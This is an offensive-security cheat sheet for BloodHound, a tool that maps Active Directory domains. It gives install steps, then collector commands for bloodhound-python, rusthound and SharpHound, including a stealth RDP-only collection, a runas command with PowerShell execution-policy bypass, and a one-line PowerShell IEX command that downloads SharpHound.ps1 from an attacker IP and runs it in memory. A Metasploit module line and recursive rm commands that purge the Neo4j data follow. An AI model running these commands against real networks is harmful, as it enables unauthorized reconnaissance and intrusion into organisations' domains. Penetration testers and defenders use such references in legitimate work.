# Bloodhound

## Installation

    sudo apt-get install neo4j
    sudo apt-get install bloodhound

##### Run neo4j then bloodhound

    sudo neo4j console
    sudo blooudhound


## Commands:

    bloodhound-python -d DOMAIN -u USER -p PASSWORD -dc DC -c all

    rusthound -d DOMAIN_TO_ENUM -u 'USER@DOMAIN' -p 'PASSWORD' -o OUTFILE.TXT -z

    Import-Module sharphound.ps1; Invoke-bloodhound -collectionmethod all -domain DOMAIN

    sharphound.exe -c all -d DOMAIN

## More ingestors

##### Standard local execution
    
    ./SharpHound.exe --CollectionMethods All,GPOLocalGroup
    Invoke-BloodHound -CollectionMethod "All,GPOLocalGroup"
    Invoke-BloodHound -CollectionMethod All -CompressData -RemoveCSV
    Invoke-BloodHound -CollectionMethod LoggedOn

##### Specify different domain and run in stealth mode and collect only RDP data

    Invoke-BloodHound --d <Domain> --Stealth --CollectionMethod RDP

##### Run in context of different user

    runas.exe /netonly /user:domain\user 'powershell.exe -nop -exec bypass'

##### Download and execute in memory

    powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('http://<IP>:/SharpHound.ps1');Invoke-BloodHound"

##### Metasploit

    use post/windows/gather/bloodhound       

## Purging Neo4j Database

    sudo rm -Rf /etc/neo4j/data/databases/* data/transactions/*
    sudo rm -Rf /etc/neo4j/data/transactions/*
